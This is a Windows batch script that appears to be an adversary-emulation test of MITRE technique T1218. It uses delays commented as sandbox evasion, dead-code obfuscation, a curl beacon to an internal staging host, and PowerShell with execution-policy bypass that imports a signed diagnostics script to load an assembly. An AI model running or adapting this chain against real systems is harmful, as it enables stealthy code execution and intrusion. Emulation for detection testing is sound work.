@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constant assignments
SET txisnba=%APPDATA%\8502\e386d10a
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8502-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=control.txt
SET dvhhyc=8502

REM Random variable names for script logic
SET zxmqp=%mdvfmsbx%
SET lolbin=UtilityFunctions.ps1
SET logpath=%APPDATA%\!rrocubc!\macula-simulations.log
SET state=0
SET next=null
SET delay1=45
SET delay2=12
SET delay3=8
SET resval=0
SET errmsg=

REM Initial delay to evade sandbox
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=initial_delay_!delay1!s>> "!logpath!" 2>nul
timeout /t !delay1! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete=success>> "!logpath!" 2>nul

GOTO yqwrz

REM Dead code block 1
:akjdhf
echo Never executed>>nul
SET fakevar=deadcode1
GOTO END

REM Real execution begins
:yqwrz
IF !state!==0 GOTO plmjkn
IF !state!==17 GOTO xcvbny
IF !state!==33 GOTO qwertz
IF !state!==57 GOTO asdfgh
IF !state!==82 GOTO yxcvbn
IF !state!==99 GOTO END

REM Dead code block 2
:mnbvcz
REM Unreachable label
EXIT

:plmjkn
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: state_machine_start=!state!>> "!logpath!" 2>nul
SET state=17
ping -n !delay2! 127.0.0.1 >nul
GOTO yqwrz

REM Dead code block 3
:lkjhgf
SET junk=more_fake_data
GOTO akjdhf

:xcvbny
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=connecting>> "!logpath!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=success>> "!logpath!" 2>nul
SET state=33
CHOICE /C Y /N /D Y /T !delay3! >nul
GOTO yqwrz

REM Dead code block 4
:poiuyt
REM Fake cleanup code
DEL /Q fakefile.txt 2>nul
GOTO mnbvcz

:qwertz
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change=attempting>> "!logpath!" 2>nul
cd /d c:\windows\diagnostics\system\networking 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change=!ERRORLEVEL!>> "!logpath!" 2>nul
SET state=57
SET /A rdelay=%RANDOM% %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!rdelay!s>> "!logpath!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete=success>> "!logpath!" 2>nul
GOTO yqwrz

REM Dead code block 5
:amskdh
REM Another dead code block
FOR /L %%i IN (1,1,10) DO echo deadloop
GOTO END

:asdfgh
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: module_import=starting>> "!logpath!" 2>nul
SET state=82
SET pscmd1=powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\!lolbin!;"
SET pscmd2=RegSnapin !txisnba!\!xzanpex!;[Program.Class]::Dale()
SET pscmd=!pscmd1!!pscmd2!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_built=success>> "!logpath!" 2>nul
timeout /t 10 /nobreak >nul
GOTO yqwrz

:yxcvbn
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: assembly_execution=attempting>> "!logpath!" 2>nul
!pscmd!
IF !ERRORLEVEL!==0 (
    SET resval=1
    SET errmsg=
) ELSE (
    SET resval=0
    SET errmsg=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: assembly_execution=!resval!>> "!logpath!" 2>nul

REM TTP logging for T1218
SET ttp_id=T1218
SET ttp_name=Signed Binary Proxy Execution
SET year=!DATE:~10,4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
SET hour=!TIME:~0,2!
SET minute=!TIME:~3,2!
SET second=!TIME:~6,2!
SET millis=!TIME:~9,2!
IF "!hour:~0,1!"==" " SET hour=0!hour:~1!
IF "!millis!"=="" SET millis=00

echo [!year!-!month!-!day! !hour!:!minute!:!second!.!millis!00][!jwcnifl!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!resval!:!errmsg!>> "!logpath!" 2>nul

SET state=99
timeout /t 8 /nobreak >nul
GOTO yqwrz

:END
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_termination=clean_exit>> "!logpath!" 2>nul
EXIT /B 0

REM Final dead code block
:zxcasd
REM This will never be reached
GOTO yqwrz